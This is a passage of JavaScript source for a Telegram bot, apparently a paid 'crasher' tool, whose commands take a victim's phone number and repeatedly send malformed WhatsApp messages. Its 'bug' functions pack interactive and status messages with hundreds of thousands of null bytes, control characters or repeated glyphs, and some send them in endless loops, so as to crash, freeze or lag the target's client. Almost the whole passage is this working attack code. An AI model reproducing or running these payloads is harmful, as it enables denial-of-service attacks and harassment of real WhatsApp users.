          text: "ᴅᴇᴠᴇʟᴏᴘᴇʀ",
          url: "https://t.me/Razzxyubot", style: "danger"
        }
      ]
    ]
  }
});

  const speed = 4;                
  const initialDelay = 0;      

  for (let i = 0; i < 330; i++) {
    await new Promise(res => setTimeout(res, initialDelay));
    await Crash(sock, target);
    await Crash(sock, target);
    await Crash(sock, target);
  }
});

//batas suci

bot.command("Voidcrasher", checkWhatsAppConnection, checkJoinChannel, checkPremium, checkCooldown, async (ctx) => {
  let number = ctx.message.text.split(" ")[1];
  if (!number) return ctx.reply(`🪧 ☇ Format: /xspam 62×××`);
  let target = number.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;
  
  let potentialColor = "🟢"

  // SEND FOTO 1 KALI DOANG, TANPA EDIT
  await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<pre>⿻νσι∂ ¢яαѕнєя⿻ 

payload
◉ Target: ${number}
◉ Type: ɪɴᴠɪsɪʙʟᴇ ʙᴜɢ
◉ username: @${ctx.from.username || ctx.from.first_name}
◉ Status : sᴜᴋsᴇs
────────────────────
 νσι∂ ¢яαѕнєя</pre>
`,
    parse_mode: "HTML",
    reply_markup: {
    inline_keyboard: [
      [
        {
          text: "ᴄᴇᴋ ꜱɪ ᴀᴍᴘᴀꜱ",
          url: `https://wa.me/${number}`, style: "primary"
        },
        {
          text: "ᴅᴇᴠᴇʟᴏᴘᴇʀ",
          url: "https://t.me/Razzxyubot", style: "danger"
        }
      ]
    ]
  }
});

  const speed = 4;                
  const initialDelay = 0;      

  for (let i = 0; i < 90; i++) {
    await new Promise(res => setTimeout(res, initialDelay));
    await VnXDelayInvisBebasSpamV2(sock, target);
    await VnXDelayInvisBebasSpamV2(sock, target);
    await VnXDelayInvisBebasSpamV2(sock, target);
  }
});

bot.command("Xdelay", checkWhatsAppConnection, checkJoinChannel, checkPremium, checkCooldown, async (ctx) => {
  let number = ctx.message.text.split(" ")[1];
  if (!number) return ctx.reply(`🪧 ☇ Format: /xspam 62×××`);
  let target = number.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  // SEND FOTO 1 KALI DOANG, TANPA EDIT
  await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<pre>⿻νσι∂ ¢яαѕнєя⿻ 

payload
◉ Target: ${number}
◉ Type: ɪɴᴠɪsɪʙʟᴇ ʙᴜɢ
◉ username: @${ctx.from.username || ctx.from.first_name}
◉ Status : sᴜᴋsᴇs
────────────────────
 νσι∂ ¢яαѕнєя</pre>
`,
    parse_mode: "HTML",
    reply_markup: {
    inline_keyboard: [
      [
        {
          text: "ᴄᴇᴋ ꜱɪ ᴀᴍᴘᴀꜱ",
          url: `https://wa.me/${number}`, style: "primary"
        },
        {
          text: "ᴅᴇᴠᴇʟᴏᴘᴇʀ",
          url: "https://t.me/Razzxyubot", style: "danger"
        }
      ]
    ]
  }
});
 
  const speed = 4;                
  const initialDelay = 0;      

  for (let i = 0; i < 90; i++) {
    await new Promise(res => setTimeout(res, initialDelay));
    await DelayXCrashVnX(sock, target);
    await DelayXCrashVnX(sock, target);
    await DelayXCrashVnX(sock, target);
  }
});

bot.command("slayerdelay", checkWhatsAppConnection, checkJoinChannel, checkPremium, checkCooldown, async (ctx) => {
  let number = ctx.message.text.split(" ")[1];
  if (!number) return ctx.reply(`🪧 ☇ Format: /xspam 62×××`);
  let target = number.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  // SEND FOTO 1 KALI DOANG, TANPA EDIT
  await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<pre>⿻νσι∂ ¢яαѕнєя⿻ 

payload
◉ Target: ${number}
◉ Type: ɪɴᴠɪsɪʙʟᴇ ʙᴜɢ
◉ username: @${ctx.from.username || ctx.from.first_name}
◉ Status : sᴜᴋsᴇs
────────────────────
 νσι∂ ¢яαѕнєя</pre>
`,
    parse_mode: "HTML",
    reply_markup: {
    inline_keyboard: [
      [
        {
          text: "ᴄᴇᴋ ꜱɪ ᴀᴍᴘᴀꜱ",
          url: `https://wa.me/${number}`, style: "primary"
        },
        {
          text: "ᴅᴇᴠᴇʟᴏᴘᴇʀ",
          url: "https://t.me/Razzxyubot", style: "danger"
        }
      ]
    ]
  }
});
 
  const speed = 4;                
  const initialDelay = 0;      

  for (let i = 0; i < 90; i++) {
    await new Promise(res => setTimeout(res, initialDelay));
    await VnXDelayHard(sock, target);
    await VnXDelayHarde(sock, target);
    await VnXDelayHard(sock, target);
  }
});

bot.command("spamkiller", checkWhatsAppConnection, checkJoinChannel, checkPremium, checkCooldown, async (ctx) => {
  let number = ctx.message.text.split(" ")[1];
  if (!number) return ctx.reply(`🪧 ☇ Format: /xspam 62×××`);
  let target = number.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  // SEND FOTO 1 KALI DOANG, TANPA EDIT
  await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<pre>⿻νσι∂ ¢яαѕнєя⿻ 

payload
◉ Target: ${number}
◉ Type: ɪɴᴠɪsɪʙʟᴇ ʙᴜɢ
◉ username: @${ctx.from.username || ctx.from.first_name}
◉ Status : sᴜᴋsᴇs
────────────────────
 νσι∂ ¢яαѕнєя</pre>
`,
    parse_mode: "HTML",
    reply_markup: {
    inline_keyboard: [
      [
        {
          text: "ᴄᴇᴋ ꜱɪ ᴀᴍᴘᴀꜱ",
          url: `https://wa.me/${number}`, style: "primary"
        },
        {
          text: "ᴅᴇᴠᴇʟᴏᴘᴇʀ",
          url: "https://t.me/Razzxyubot", style: "danger"
        }
      ]
    ]
  }
});
 
  const speed = 4;                
  const initialDelay = 0;      

  for (let i = 0; i < 90; i++) {
    await new Promise(res => setTimeout(res, initialDelay));
    await delayhard(sock, target);
    await delayhard(sock, target);
    await delayhard(sock, target);
  }
});

bot.command("Xcline", checkWhatsAppConnection, checkJoinChannel, checkPremium, checkCooldown, async (ctx) => {
  let number = ctx.message.text.split(" ")[1];
  if (!number) return ctx.reply(`🪧 ☇ Format: /xspam 62×××`);
  let target = number.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  // SEND FOTO 1 KALI DOANG, TANPA EDIT
  await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<pre>⿻νσι∂ ¢яαѕнєя⿻ 

payload
◉ Target: ${number}
◉ Type: ɪɴᴠɪsɪʙʟᴇ ʙᴜɢ
◉ username: @${ctx.from.username || ctx.from.first_name}
◉ Status : sᴜᴋsᴇs
────────────────────
 νσι∂ ¢яαѕнєя</pre>
`,
    parse_mode: "HTML",
    reply_markup: {
    inline_keyboard: [
      [
        {
          text: "ᴄᴇᴋ ꜱɪ ᴀᴍᴘᴀꜱ",
          url: `https://wa.me/${number}`, style: "primary"
        },
        {
          text: "ᴅᴇᴠᴇʟᴏᴘᴇʀ",
          url: "https://t.me/Razzxyubot", style: "danger"
        }
      ]
    ]
  }
});
 
  const speed = 4;                
  const initialDelay = 0;      

  for (let i = 0; i < 90; i++) {
    await new Promise(res => setTimeout(res, initialDelay));
    await delayinvisxeon(sock, target);
    await delayinvisxeon(sock, target);
    await delayinvisxeon(sock, target);
  }
});

//------------- FUNCTION BUG -------------///
async function delayinvisxeon(sock, target) {
  const msg = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: {
            text: "XX"
          },
          nativeFlowMessage: {
            buttons:
              Array.from({ length: 500000 }, () => ({}))
          }
        }
      }
    }
  };

  await sock.relayMessage(target, msg, {
    participant: { jid: target }
  });

  await sock
    .relayMessage("status@broadcast", {
      interactiveResponseMessage: {
        body: {
          text: "XX",
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "call_permission_request",
          paramsJson: "FORM_SCREEN",
          version: 3
        },
        contextInfo: {
          remoteJid:
            Math.random().toString(36) +
            "CALL_ACCESS",
          isForwarded: true,
          forwardingScore: 999,
          urlTrackingMap: {
            urlTrackingMapElements:
              Array.from({ length: 900000 }, () => ({
                "xN0000": "Grettles"
              }))
          }
        }
      },
      participant: { jid: target },
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: { status_setting: "contacts" },
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: []
                }
              ]
            }
          ]
        }
      ]
    });
}

async function delayhard(sock, target) {
    const genJid = (len) => Array.from({ length: len }, () => '1' + Math.floor(Math.random() * 900000) + '@s.whatsapp.net');

    const p1 = {
        groupStatusMessageV2: {
            message: {
                interactiveResponseMessage: {
                    body: { text: "Maklo", format: "DEFAULT" },
                    nativeFlowResponseMessage: {
                        name: "address_message",
                        paramsJson: "\n".repeat(250000) + "\u0000".repeat(250000),
                        version: 3
                    }
                }
            }
        },
        contextInfo: {
            remoteJid: "#delay - By @Raffioffci5",
            mentionedJid: ['0@s.whatsapp.net', ...genJid(2000)]
        }
    };

    const p2 = {
        groupStatusMessageV2: {
            message: {
                interactiveResponseMessage: {
                    contextInfo: {
                        participant: target,
                        mentionedJid: ['0@s.whatsapp.net', ...genJid(2000)],
                        body: { text: 'Yyey', format: 'DEFAULT' },
                        footer: { text: '\u0000'.repeat(25000), format: 'DEFAULT' },
                        nativeFlowResponseMessage: {
                            name: 'galaxy_message',
                            paramsJson: `{"flow_cta":{"title":"${"\u0000".repeat(990000)}"}}}`,
                            version: 3
                        }
                    }
                }
            }
        }
    };

    await sock.relayMessage(target, p1, { participant: { jid: target } });
    await sock.relayMessage(target, p2, { participant: { jid: target } });
}

async function VnXDelayHard(sock, target) {
  let msg1 = {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          header: {
            title: "\u0000.@Raffioffci5" + "{{".repeat(900000)
          },
          body: {
            text: "VnX",
            footer: "By @Raffioffci5"
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\u0000".repeat(400000),
            version: 3
          },
          entryPointConversionSource: "call_permission_request",
remoteJid: "status@broadcast"
        }
      }
    }
  };

  await sock.relayMessage(target, msg1, {
    message: null,
    participant: { jid: target },
    userJid: target,
  });
}

async function DelayXCrashVnX(sock, target) {
    try {
        const msg = {
            groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: "VnX New Era"
                        },
                        nativeFlowMessage: {
                            name: "vnx_gacorf",
                            buttons: "\u001A".repeat(500000)
                        }
                    }
                }
            }
        };

        await sock.relayMessage(target, msg, {});
        console.log("success send");
    } catch (err) {
        console.error("Error:", err);
    }
}

async function VnXDelayInvisBebasSpamV2(sock, target) {
  while (true) {
    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "VnX",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "address_message",
              paramsJson: `{"values":{"in_pin_code":"xxx","building_name":"xxx","landmark_area":"X","address":"xxx","tower_number":"maklo","city":"porno","name":"crb","phone_number":"xxx","house_number":"xxx","floor_number":"xxx","state":"yandex | ${"\u0000".repeat(1045000)}"}}`,
              version: 3
            },
            contextInfo: {
              mentionedJid: target,
              isForwarded: true
            }
          }
        }
      }
    }, { participant: { jid: target } });
  }
}

async function FrezeChat(sock, target) {
  const msg = {
  groupStatusMessageV2: {
    message: {
      interactiveMessage: {
         body: {
           text: "itu dia lohh"
      },
      NativeFlowMessage: {
        buttons: [
          "0@s.whatsapp.net",
          ...Array.from(
            { length: 1999 },
          )
        ],
        name: "\x10".repeat(50000)
     },
     nativeFlowMessage: {
        name: "galaxy_message",
        buttons: "\u0000".repeat(250000) + "\x10".repeat(250000)
        }
      }
    }
  }
};
 await sock.relayMessage(target, msg, {
   statusJid: { target }
 });
}

async function Crash(sock, target) {
    await sock.relayMessage(target, {
        participant: {jid : target},
        interactiveResponseMessage: {
        body: {
          text: "Noskil New Here",
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "catalog_message",
          paramsJson: '{ "title": "Haii, I am Noskil", "description": "Nexi Here Cuy", "products": { "id": "prod_", "name": "Noskil IS HERE", "price": "Rp 999.999", "currency": "IDR", "image_url": "https://example.com/" } }',
          version: 3
        },
        messageParamsJson: '{}'
      },
      contextInfo: {
        mentionedJid: target,
        isForwarded: true
      },
     nativeFlowMessage: {
      buttons: [
        {
          name: "payment_method",
          buttonParamsJson: "{}"
        }
      ],
     messageParamsJson: "{}"
    }
  },
  {
   additionalNodes: [
    {
      tag: "biz",
      attrs: {
        native_flow_name: "payment_method"
       }
     } 
   ]
 });
}

async function lockchat(sock, target) {
  const memek = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          header: {
            title: "jembut",
            hasMediaAttachment: true
          },
          nativeFlowMessage: {
            buttons: "\0".repeat(500000)
          }
        }
      }
    }
  };

  const jembut = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: { text: "VnX" + 'ꦽ'.repeat(50000) },
          footer: { text: 'VnX' },
          nativeFlowMessage: {
            buttons: Array.from({ length: 100000 }, (_, i) => ({
              id: 'ꦽ'.repeat(50000),
              title: 'ꦽ'.repeat(50000)
            }))
          }
        }
      }
    }
  };

  await sock.relayMessage(target, memek, jembut, {
    participant: { jid: target }
  }).catch(error => console.error("Gagal mengirim pesan:", error));
}

async function invisibledelay(sock, target) {
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "XB",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: `{"values":{"in_pin_code":"xxx","building_name":"xxx","landmark_area":"X","address":"xxx","tower_number":"maklo","city":"porno","name":"crb","phone_number":"xxx","house_number":"xxx","floor_number":"xxx","state":"yandex | ${"\u0000".repeat(1045000)}"}}`,
            version: 3
          },
          contextInfo: {
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 2,
                expiryTimestamp: Math.floor(Date.now() / 1000) + 8640000
              }
            }
          }
        }
      }
    }
  }, { participant: { jid: target } });

  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        extendedTextMessage: {
          text: "\u0000".repeat(75000),
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1999 },
                () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
              )
            ]
          }
        }
      }
    }
  }, { participant: { jid: target } });
}

async function ArTDelay(sock, target, mention = true) {
  console.log(`Success send bug to ${target}`);
  while (true) {
    var oracle = generateWAMessageFromContent(target, {
      interactiveResponseMessage: {
        contextInfo: {
          mentionedJid: Array.from(
            { length: 2000 },
            (_, r) => `6285983729${r + 1}@s.whatsapp.net`
          )
        },
        body: {
          text: "A - r - T",
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "galaxy_message",
          paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}}`,
          version: 3
        }
      }
    }, {});

    await sock.relayMessage(
      target,
      {
        groupStatusMessageV2: {
          message: oracle.message
        }
      },
      mention
        ? { messageId: oracle.key.id, participant: { jid: target } }
        : { messageId: oracle.key.id }
    );
  }

  console.log(chalk.red(`Succes Sending To ${target}`));
}

async function gokil(sock, target) {
  const msg = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: { text: "" },
          nativeFlowMessage: {
            buttons: [
              {
                name: "call_permission_request",
                buttonParamsJson: JSON.stringify({
                  display_text: "\u0000",
                  icon: "PAYMENT",
                  params: {
                    reason: "ꦽ".repeat(150000),
                    context: "ꦽ".repeat(100000)
                  }
                })
              }
            ]
          }
        }
      }
    }
  };
  await sock.relayMessage(target, msg, { participant: { jid: target } });
}
//

bot.launch();
